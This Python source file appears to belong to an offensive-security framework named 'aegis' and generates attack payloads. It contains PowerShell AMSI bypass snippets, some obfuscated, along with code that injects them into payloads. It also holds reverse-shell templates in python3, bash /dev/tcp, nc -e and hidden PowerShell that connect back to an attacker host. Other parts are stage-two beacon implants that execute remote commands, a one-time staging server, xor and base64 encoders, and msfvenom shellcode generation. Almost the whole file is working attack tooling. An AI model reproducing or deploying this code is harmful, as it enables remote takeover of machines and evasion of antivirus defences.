from __future__ import annotations

import asyncio
import base64
import os
import secrets
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Any

from aegis.utils.errors import PayloadError
from aegis.utils.logger import AegisLogger


@dataclass
class Payload:
    raw: bytes
    encoded: bytes
    encoding: str
    metadata: dict[str, Any] = field(default_factory=dict)


class AmsiBypass:
    def __init__(self, name: str, script: str, enabled: bool = True,
                 target_os: str = "windows", description: str = "") -> None:
        self.name = name
        self.script = script
        self.enabled = enabled
        self.target_os = target_os
        self.description = description or name


class AmsiBypassRegistry:
    def __init__(self) -> None:
        self._bypasses: dict[str, AmsiBypass] = {}
        self._log = AegisLogger("amsi-registry").get()
        self._register_defaults()

    def _register_defaults(self) -> None:
        self.register(AmsiBypass(
            name="amsi_mem_patch",
            description="Patch AMSI via Marshal.AllocHGlobal (Cobalt Strike style)",
            script="$([System.Runtime.InteropServices.Marshal]::AllocHGlobal(1024))",
        ))
        self.register(AmsiBypass(
            name="amsi_init_failed",
            description="Set amsiInitFailed via reflection",
            script=(
                "$x=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
                "$y=$x.GetField('amsiInitFailed','NonPublic,Static');"
                "$y.SetValue($null,$true)"
            ),
        ))
        self.register(AmsiBypass(
            name="amsi_binary_decode",
            description="Base64-decoded AMSI disable stub",
            script=(
                "$x=$([Text.Encoding]::Unicode.GetString("
                "[Convert]::FromBase64String('JABBAE0AUwBJACAAKAApADsA')))"
            ),
        ))
        self.register(AmsiBypass(
            name="amsi_hp_string",
            description="HP-Hardened string obfuscation",
            script=(
                "S`eT-It`em (''V'+'aR'+'iA'+'bL'+'e:1q'+'2u'+'3x'') "
                "(''+'R'+'u'+'n'+'n'+'e'+'r')"
            ),
        ))
        self.register(AmsiBypass(
            name="amsi_forbidden_types",
            description="Remove AMSI from ForbiddenTypes cache",
            script=(
                "$f=[Ref].Assembly.GetType([String](0..5|%%{[char][int]("
                "[System.Text.Encoding]::Unicode.GetString("
                "[Convert]::FromBase64String('VABsAGEALQBVAHQAaQBsAHMALgBDAE8AbwByAGQAaQBuAGEAdABvAHIA')"
                ")[$_])}));"
                "$g=$f.GetField([String](0..2|%%{[char][int]("
                "[System.Text.Encoding]::Unicode.GetString("
                "[Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARQB4AGUAYwB1AHQAaQBvAG4ARQBuAHYAaQByAG8AbgBtAGUAbgB0AFMAdAByAGkAbgBnAFMAZQB0AHQAaQBuAGcAcwA=')"
                ")[$_])}),'NonPublic,Static');$g.SetValue($null,$null)"
            ),
        ))

    def register(self, bypass: AmsiBypass) -> None:
        self._bypasses[bypass.name] = bypass
        self._log.debug("AMSI bypass registered: %s", bypass.name)

    def unregister(self, name: str) -> None:
        self._bypasses.pop(name, None)
        self._log.debug("AMSI bypass unregistered: %s", name)

    def enable(self, name: str) -> None:
        b = self._bypasses.get(name)
        if b:
            b.enabled = True

    def disable(self, name: str) -> None:
        b = self._bypasses.get(name)
        if b:
            b.enabled = False

    def list_bypasses(self) -> list[dict[str, Any]]:
        return [
            {"name": b.name, "enabled": b.enabled, "description": b.description}
            for b in self._bypasses.values()
        ]

    def get_script(self, name: str) -> str | None:
        b = self._bypasses.get(name)
        if b and b.enabled:
            return b.script
        return None

    def get_enabled_scripts(self, target_os: str = "windows") -> list[str]:
        return [
            b.script for b in self._bypasses.values()
            if b.enabled and b.target_os == target_os
        ]

    def inject_payload(self, payload: str, target_os: str = "windows") -> str:
        scripts = self.get_enabled_scripts(target_os)
        if not scripts:
            return payload
        for script in scripts:
            # Inject AMSI bypass before the first socket/Net.WebClient call
            for marker in ("New-Object System.Net.Sockets", "New-Object Net.WebClient"):
                if marker in payload:
                    payload = payload.replace(marker, f"{script};{marker}")
                    break
        return payload


STAGE0_TEMPLATES: dict[str, str] = {
    "linux_python3": (
        "python3 -c \"import socket,subprocess;s=socket.socket();"
        "s.connect(('{lhost}',{lport}));"
        "subprocess.check_call(['python3','-c',s.recv(4096).decode()])\""
    ),
    "linux_bash": (
        "bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; cat <&3 | bash >&3 2>&3'"
    ),
    "linux_nc": (
        "nc {lhost} {lport} -e /bin/bash 2>/dev/null || "
        "nc -c /bin/bash {lhost} {lport} 2>/dev/null"
    ),
    "windows_powershell": (
        'powershell -NoP -NonI -W Hidden -Exec Bypass '
        '-c "$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});'
        '$s=$c.GetStream();$b=New-Object byte[] 4096;'
        'while(($i=$s.Read($b,0,$b.Length))-ne0){{'
        '$d=([Text.Encoding]::ASCII).GetString($b,0,$i);'
        '$r=(iex $d 2>&1 | Out-String);'
        '$t=([Text.Encoding]::ASCII).GetBytes($r+\'> \');$s.Write($t,0,$t.Length);$s.Flush()'
        '}};$c.Close()"'
    ),
    "windows_cmd_powershell": (
        'cmd /c powershell -NoP -NonI -W Hidden -Exec Bypass -e {encoded}'
    ),
}


STAGE1_BEACON_LINUX: str = (
    "import socket,subprocess,os,json,sys,time,struct\n"
    "LHOST='{lhost}';LPORT={lport};TOKEN='{token}'\n"
    "def run(c):\n"
    " try: r=subprocess.check_output(c,shell=True,stderr=subprocess.STDOUT,timeout=30).decode(errors='replace')\n"
    " except Exception as e: r=str(e)\n"
    " return r\n"
    "while True:\n"
    " try:\n"
    "  s=socket.socket();s.settimeout(60);s.connect((LHOST,LPORT))\n"
    "  s.send(json.dumps({{'token':TOKEN,'host':socket.gethostname(),'user':run('whoami')}}).encode())\n"
    "  while True:\n"
    "   try:\n"
    "    d=s.recv(65536)\n"
    "    if not d: break\n"
    "    cmd=d.decode().strip()\n"
    "    if cmd=='PING': s.send(b'PONG')\n"
    "    elif cmd=='QUIT': break\n"
    "    elif cmd.startswith('CD '): os.chdir(cmd[3:].strip()); s.send(b'OK')\n"
    "    else: s.send(run(cmd).encode())\n"
    "   except socket.timeout: s.send(json.dumps({{'hb':True}}).encode())\n"
    " except Exception: time.sleep(5)\n"
)

STAGE1_BEACON_WINDOWS_PS: str = (
    "$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});\n"
    "$s=$c.GetStream();$r=New-Object byte[] 65536;\n"
    "while(($i=$s.Read($r,0,$r.Length))-ne0){{\n"
    " $d=([Text.Encoding]::ASCII).GetString($r,0,$i);\n"
    " if($d-eq'PING'){{$b=[Text.Encoding]::ASCII.GetBytes('PONG')}}\n"
    " elseif($d-eq'QUIT'){{break}}\n"
    " else{{\n"
    "  $o=iex $d 2>&1 | Out-String;\n"
    "  $b=[Text.Encoding]::ASCII.GetBytes($o)\n"
    " }}\n"
    " $s.Write($b,0,$b.Length);$s.Flush()\n"
    "}}\n"
    "$c.Close()\n"
)


class StagingServer:
    def __init__(self, lhost: str, lport: int) -> None:
        self._lhost = lhost
        self._lport = lport
        self._server: asyncio.AbstractServer | None = None
        self._stage2_payload: bytes | None = None
        self._stage2_token: str | None = None
        self._ttl: float | None = None
        self._started_at: float = 0.0
        self._one_time: bool = True
        self._consumed: bool = False
        self._log = AegisLogger("staging").get()

    def set_stage2(self, payload: bytes, token: str | None = None,
                   one_time: bool = True, ttl: float | None = 300.0) -> None:
        self._stage2_payload = payload
        self._stage2_token = token or secrets.token_urlsafe(16)
        self._one_time = one_time
        self._ttl = ttl
        self._consumed = False

    async def start(self) -> tuple[int, str]:
        async def handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
            peername = writer.get_extra_info("peername")
            token_param = ""
            try:
                data = await asyncio.wait_for(reader.read(4096), timeout=10.0)
                request_line = data.decode(errors="replace").split("\r\n")[0]
                parts = request_line.split()
                if len(parts) > 1:
                    path = parts[1]
                    if path.startswith("/"):
                        token_param = path.lstrip("/")
            except (asyncio.TimeoutError, UnicodeDecodeError):
                pass

            if self._ttl and (time.time() - self._started_at) > self._ttl:
                writer.write(b"HTTP/1.1 410 Gone\r\nContent-Length: 0\r\n\r\n")
                await writer.drain()
                writer.close()
                return

            if self._consumed and self._one_time:
                writer.write(b"HTTP/1.1 410 Gone\r\nContent-Length: 0\r\n\r\n")
                await writer.drain()
                writer.close()
                self._log.warning("Staging server: replayed fetch from %s (blocked)", peername)
                return

            if self._stage2_token and token_param != self._stage2_token:
                writer.write(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
                await writer.drain()
                writer.close()
                self._log.warning("Staging server: bad token from %s", peername)
                return

            payload = self._stage2_payload or b""
            resp = (
                f"HTTP/1.1 200 OK\r\n"
                f"Content-Length: {len(payload)}\r\n"
                f"Content-Type: application/octet-stream\r\n"
                f"Cache-Control: no-store, must-revalidate\r\n"
                f"\r\n"
            ).encode() + payload
            writer.write(resp)
            await writer.drain()
            writer.close()

            if self._one_time:
                self._consumed = True
                self._log.info("Staging server: payload delivered (one-time), marked consumed")

        self._server = await asyncio.start_server(handle, host=self._lhost, port=0)
        port = self._server.sockets[0].getsockname()[1]
        self._started_at = time.time()
        token = self._stage2_token or secrets.token_urlsafe(16)
        self._log.info("Staging server on %s:%d (token=%s, one_time=%s, ttl=%s)",
                       self._lhost, port, token, self._one_time, self._ttl)
        return port, token

    @property
    def stage2_url(self) -> str:
        if self._stage2_token:
            return f"http://{self._lhost}:{self._lport}/{self._stage2_token}"
        return f"http://{self._lhost}:{self._lport}/"

    async def stop(self) -> None:
        if self._server:
            self._server.close()
            await self._server.wait_closed()
            self._log.info("Staging server stopped")


class PayloadGenerator(ABC):
    def __init__(self, lhost: str, lport: int, arch: str = "x64",
                 amsi_registry: AmsiBypassRegistry | None = None) -> None:
        self._lhost = lhost
        self._lport = lport
        self._arch = arch
        self._amsi = amsi_registry or AmsiBypassRegistry()
        self._log = AegisLogger(self.__class__.__name__).get()

    @abstractmethod
    async def generate(self, payload_type: str = "reverse_tcp", **kwargs: Any) -> Payload:
        ...

    async def encode(self, payload: Payload, scheme: str = "base64") -> Payload:
        if scheme == "base64":
            encoded = base64.b64encode(payload.raw)
        elif scheme == "hex":
            encoded = payload.raw.hex().encode()
        elif scheme.startswith("xor:"):
            key = scheme.split(":", 1)[1].encode()
            encoded = bytes(b ^ key[i % len(key)] for i, b in enumerate(payload.raw))
        elif scheme == "raw":
            encoded = payload.raw
        else:
            raise PayloadError(f"Unknown encoding scheme: {scheme}")
        return Payload(
            raw=payload.raw, encoded=encoded, encoding=scheme, metadata=payload.metadata
        )


class ShellcodePayload(PayloadGenerator):
    PLATFORMS = {
        "linux/x64": "linux/x64",
        "linux/x86": "linux/x86",
        "windows/x64": "windows/x64",
        "windows/x86": "windows/x86",
        "macos/x64": "osx/x64",
    }

    async def generate(self, payload_type: str = "reverse_tcp", **kwargs: Any) -> Payload:
        platform = self.PLATFORMS.get(kwargs.get("platform", f"linux/{self._arch}"), "linux/x64")
        fmt = kwargs.get("format", "raw")

        msf_payload = {
            "reverse_tcp": f"{platform}/shell_reverse_tcp",
            "bind_tcp": f"{platform}/shell_bind_tcp",
            "meterpreter_reverse_tcp": f"{platform}/meterpreter_reverse_tcp",
            "reverse_https": f"{platform}/shell_reverse_https",
        }.get(payload_type)

        if not msf_payload:
            raise PayloadError(f"Unknown shellcode payload: {payload_type}")

        cmd = [
            "msfvenom",
            "-p", msf_payload,
            f"LHOST={self._lhost}",
            f"LPORT={self._lport}",
            "-f", fmt,
            "--smallest",
        ]

        self._log.debug("Generating shellcode: %s", " ".join(cmd))

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30.0)
        except FileNotFoundError:
            self._log.warning("msfvenom not found — falling back to script payload")
            raise PayloadError("msfvenom not installed") from None

        if proc.returncode != 0:
            err = stderr.decode(errors="replace").strip()
            raise PayloadError(f"msfvenom failed: {err}")

        return Payload(
            raw=stdout,
            encoded=stdout,
            encoding="raw",
            metadata={
                "type": payload_type,
                "platform": platform,
                "lhost": self._lhost,
                "lport": self._lport,
                "size": len(stdout),
            },
        )


class ScriptPayload(PayloadGenerator):
    def __init__(self, lhost: str, lport: int, arch: str = "x64",
                 amsi_registry: AmsiBypassRegistry | None = None) -> None:
        super().__init__(lhost, lport, arch, amsi_registry=amsi_registry)
        self._stage2_token: str = base64.b64encode(os.urandom(12)).decode()[:16]
        self._staging_server: StagingServer | None = None

    async def generate(self, payload_type: str = "reverse_tcp", **kwargs: Any) -> Payload:
        target_os = kwargs.get("target_os", "linux")
        staged = kwargs.get("staged", True)
        use_amsi = kwargs.get("amsi_bypass", True)

        if staged and payload_type == "reverse_tcp":
            return await self._generate_staged(target_os, use_amsi)

        return await self._generate_oneshot(target_os)

    async def _generate_staged(self, target_os: str, use_amsi: bool) -> Payload:
        if target_os == "windows":
            dropper = STAGE0_TEMPLATES["windows_powershell"].format(
                lhost=self._lhost, lport=self._lport
            )
            if use_amsi:
                dropper = self._amsi.inject_payload(dropper, "windows")

            beacon = STAGE1_BEACON_WINDOWS_PS.format(
                lhost=self._lhost, lport=self._lport
            )
        else:
            dropper = STAGE0_TEMPLATES["linux_python3"].format(
                lhost=self._lhost, lport=self._lport
            )
            token = self._stage2_token
            beacon = STAGE1_BEACON_LINUX.format(
                lhost=self._lhost, lport=self._lport, token=token
            )

        meta = {
            "type": "reverse_tcp",
            "staged": True,
            "target_os": target_os,
            "lhost": self._lhost,
            "lport": self._lport,
            "stage2_length": len(beacon),
            "stage2_token": self._stage2_token if target_os != "windows" else "",
        }

        if self._staging_server:
            self._staging_server.set_stage2(beacon.encode())

        return Payload(
            raw=dropper.encode(),
            encoded=dropper.encode(),
            encoding="raw",
            metadata=meta,
        )

    async def _generate_oneshot(self, target_os: str) -> Payload:
        if target_os == "windows":
            raw = STAGE0_TEMPLATES["windows_powershell"].format(
                lhost=self._lhost, lport=self._lport
            )
            raw = self._amsi.inject_payload(raw, "windows")
        else:
            fallback_chain = "; ".join([
                STAGE0_TEMPLATES["linux_python3"].format(lhost=self._lhost, lport=self._lport),
                STAGE0_TEMPLATES["linux_bash"].format(lhost=self._lhost, lport=self._lport),
                STAGE0_TEMPLATES["linux_nc"].format(lhost=self._lhost, lport=self._lport),
            ])
            raw = fallback_chain.encode()

        return Payload(
            raw=raw if isinstance(raw, bytes) else raw.encode(),
            encoded=base64.b64encode(raw if isinstance(raw, bytes) else raw.encode()),
            encoding="base64",
            metadata={
                "type": "reverse_tcp",
                "staged": False,
                "target_os": target_os,
                "lhost": self._lhost,
                "lport": self._lport,
            },
        )

    async def staging_server(self) -> StagingServer:
        if self._staging_server is None:
            self._staging_server = StagingServer(self._lhost, self._lport)
            port, token = await self._staging_server.start()
            self._staging_server.set_stage2(b"", token=token)
        return self._staging_server
